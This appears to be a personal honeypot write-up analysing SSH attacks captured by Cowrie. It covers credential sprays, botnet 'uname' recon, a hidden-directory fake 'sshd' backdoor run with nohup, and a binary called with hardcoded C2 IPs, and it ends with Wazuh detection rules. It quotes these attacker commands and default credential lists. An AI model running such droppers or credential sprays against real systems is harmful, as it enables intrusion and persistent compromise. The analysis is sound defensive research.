# Cowrie SSH Honeypot — Attack Pattern Analysis

**Document ID:** NINGI-WRITEUP-002
**Date:** 2026-03-10
**Category:** Threat Intelligence / Honeypot Analysis
**Environment:** fuji-mailbox VPS — Cowrie 2.x / Wazuh 4.14.0

---

## Overview

This writeup analyses real attack traffic I captured with a Cowrie SSH honeypot running on a public-facing VPS (BinaryLane, Queensland, Australia). The honeypot runs on port 22 with no banner modification, so it presents as a standard OpenSSH server. All login attempts and commands shown here came from real attackers on the public internet.

Cowrie logs all attacker activity including credentials attempted, commands run, and files downloaded — without the attacker's knowledge that they are inside a sandboxed environment.

---

## Volume & Top Attackers

Login attempt frequency over the observation period:

| Rank | IP Address | Attempts | Notes |
|---|---|---|---|
| 1 | `209.38.226.254` | 247 | DigitalOcean — high volume credential spray |
| 2 | `213.209.159.159` | 39 | |
| 3 | `2.57.121.25` | 35 | |
| 4 | `64.225.70.34` | 29 | DigitalOcean |
| 5 | `142.93.130.178` | 26 | DigitalOcean |
| 6 | `206.189.100.42` | 23 | DigitalOcean |
| 7 | `81.30.212.94` | 22 | |
| 8 | `187.45.100.0` | 21 | |
| 9 | `134.209.31.148` | 18 | |
| 10 | `165.22.194.104` | 18 | DigitalOcean |

**Observation:** 5 of the top 10 attacking IPs resolve to DigitalOcean ASN (AS14061). This is consistent with the well-documented pattern of attackers renting cheap cloud VMs to conduct credential spraying campaigns — cloud IPs are not blocked by default and have high outbound bandwidth.

---

## Attack Patterns

### Pattern 1 — Automated Credential Spray (Most Common)

The most common pattern is a fully automated credential spray with no post-login activity. The attacker logs in, verifies the connection works, then disconnects — the actual exploitation is handled separately once valid credentials are harvested.

**Characteristics:**
- Login attempt followed immediately by disconnect
- No commands executed
- Session duration typically under 3 seconds
- Same source IP attempts dozens of username/password combinations

**Example session from logs:**
```
cowrie.login.failed  username="fangdaohong"  password="123"  src_ip="177.85.247.230"
cowrie.session.closed  duration="2.9"
```

**Credential patterns observed:**
- Default credentials: `root/root`, `root/123456`, `admin/admin`, `admin/password`
- Common usernames: `root`, `admin`, `ubuntu`, `user`, `test`, `oracle`, `postgres`
- Chinese usernames appearing in spray lists (e.g. `fangdaohong`) — suggests credential lists sourced from previous breaches of Chinese-language services

---

### Pattern 2 — Architecture Fingerprinting (Automated Botnet)

A distinct cluster of IPs all run an identical command sequence immediately after login. This is a botnet dropper performing system reconnaissance before deploying a payload suited to the target architecture.

**IPs running this exact pattern:**
```
162.243.31.41, 164.90.196.65, 165.22.194.104, 167.71.227.49,
170.64.160.204, 170.64.183.26, 170.64.191.10, 188.166.29.223,
206.189.100.42, 206.189.7.166, 209.38.18.85, 64.225.70.34
```

**Command sequence (identical across all IPs):**
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
uname=$(uname -s -v -n -m 2>/dev/null)
arch=$(uname -m 2>/dev/null)
uname -m 2>/dev/null
uname -s -v -n -m 2>/dev/null
```

**Analysis:**
- The `export PATH` line ensures binaries can be found even on locked-down systems with a restricted PATH
- `uname -s -v -n -m` returns: OS type, kernel version, hostname, and machine architecture
- Results are used to select the correct binary variant to download (x86_64, ARM, MIPS, etc.)
- 12+ different IPs running the **exact same command sequence** confirms this is a single botnet campaign operating across multiple cloud-rented nodes
- All IPs resolve to DigitalOcean — strongly suggests a coordinated campaign using rented infrastructure

**MITRE ATT&CK:** T1082 — System Information Discovery

---

### Pattern 3 — Backdoor Dropper with Process Masquerading

The most sophisticated payload observed. The attacker places a binary inside a randomly-named hidden directory and executes it masquerading as a legitimate system process (`sshd`).

**Source IP:** `142.93.220.184`

**Payload:**
```bash
chmod +x ./.1455647341291108698/sshd
nohup ./.1455647341291108698/sshd &
```

**Analysis:**
- Directory name `.1455647341291108698` is a random numeric string — inconspicuous in directory listings and hard to search for
- Binary named `sshd` — impersonates the legitimate SSH daemon to blend into process listings (`ps aux`)
- `nohup ... &` runs the process in the background, detached from the session — persists after the attacker disconnects
- Leading `.` makes the directory hidden from standard `ls` output
- This is a classic **process masquerading** technique

**What the fake sshd likely does:**
- Establishes a reverse shell or C2 beacon
- Opens a backdoor listening port
- Joins a botnet for DDoS or cryptomining

**MITRE ATT&CK:**
- T1036.005 — Masquerade: Match Legitimate Name or Location
- T1059.004 — Command and Scripting Interpreter: Unix Shell
- T1543 — Create or Modify System Process

---

### Pattern 4 — C2 Callback with Hardcoded IPs

An attacker passing command-and-control server IPs as arguments to a downloaded binary.

**Source IP:** `27.107.150.54`

**Payload:**
```bash
./payload 57.129.54.69 103.61.122.197
```

**Analysis:**
- Two C2 IPs passed as arguments — likely primary and fallback C2 servers
- `57.129.54.69` — OVH/Leaseweb hosted, commonly used by threat actors for C2 infrastructure
- `103.61.122.197` — Asian hosting provider
- Consistent with botnet implants that beacon home to a C2 server for further instructions
- Hardcoding C2 IPs (vs. domain names) is simpler but fragile — a single IP block kills the campaign

**MITRE ATT&CK:**
- T1071.001 — Application Layer Protocol: Web Protocols
- T1102 — Web Service (C2 over hosted infrastructure)

---

## SSH Client Fingerprinting (HASSH)

Cowrie captures SSH client fingerprints (HASSH) which identify the scanning tool being used even when the source IP changes.

**Example from logs:**
```
hassh: 03a80b21afa810682a776a7d42e5e6fb
kexAlgs: curve25519-sha256, ecdh-sha2-nistp256, diffie-hellman-group18-sha512...
```

The HASSH value `03a80b21afa810682a776a7d42e5e6fb` is associated with standard OpenSSH clients — suggesting either legitimate OpenSSH tooling or a scanner that spoofs the OpenSSH fingerprint. Custom attack tools often have distinctive HASSH values that persist across IP changes, making them useful for campaign tracking.

---

## Campaign Clustering

Based on command sequence analysis, at least **four distinct campaigns** are identifiable in the data:

| Campaign | Indicator | IPs Observed | Likely Purpose |
|---|---|---|---|
| Botnet A | Identical `uname` fingerprint sequence | 12+ DigitalOcean IPs | Architecture recon → payload drop |
| Credential Spray | High volume, no post-login commands | `209.38.226.254` + others | Harvesting valid credentials |
| Backdoor Dropper | Hidden dir + sshd masquerade | `142.93.220.184` | Persistent backdoor / botnet node |
| C2 Implant | Binary with hardcoded C2 IPs | `27.107.150.54` | Botnet C2 callback |

---

## Defensive Takeaways

- **Default credentials are hammered constantly** — any internet-exposed SSH with password auth will be compromised within hours if using common passwords
- **Automated campaigns dominate** — the vast majority of attacks are fully automated bots, not human operators
- **DigitalOcean is heavily abused** — 5 of the top 10 attacking IPs are DO-hosted. IP reputation blocklists targeting cloud provider ranges are a practical first defence layer
- **Architecture fingerprinting is universal** — nearly every sophisticated attacker checks `uname -m` before dropping a payload
- **Process masquerading is common** — naming malicious binaries after legitimate processes (`sshd`, `systemd`, `kworker`) is a standard evasion technique

---

## Detection Rules

Custom Wazuh rules for patterns observed in this analysis:

```xml
<!-- Cowrie: attacker logged in -->
<rule id="100102" level="12">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.login.success</field>
  <description>Cowrie: Attacker logged into honeypot from $(data.src_ip)</description>
  <group>cowrie,honeypot,</group>
</rule>

<!-- Cowrie: architecture fingerprinting detected -->
<rule id="100103" level="10">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>uname -s -v -n -m</match>
  <description>Cowrie: Architecture fingerprinting command observed</description>
  <group>cowrie,recon,</group>
</rule>

<!-- Cowrie: backdoor persistence attempt -->
<rule id="100104" level="14">
  <if_sid>100100</if_sid>
  <field name="eventid">cowrie.command.input</field>
  <match>nohup</match>
  <description>Cowrie: Possible backdoor persistence attempt (nohup)</description>
  <group>cowrie,persistence,</group>
</rule>
```

---

## MITRE ATT&CK Summary

| Technique | ID | Observed |
|---|---|---|
| Valid Accounts: Default Accounts | T1078.001 | Credential spray with default passwords |
| System Information Discovery | T1082 | `uname` architecture fingerprinting |
| Masquerade: Match Legitimate Name | T1036.005 | Binary named `sshd` in hidden directory |
| Unix Shell | T1059.004 | Bash commands for persistence |
| C2: Application Layer Protocol | T1071.001 | Hardcoded C2 IP callbacks |
| Hide Artifacts: Hidden Files | T1564.001 | Hidden directory with leading `.` |

---

*Everything in this writeup came from real attack traffic captured by my Cowrie honeypot in March 2026.*
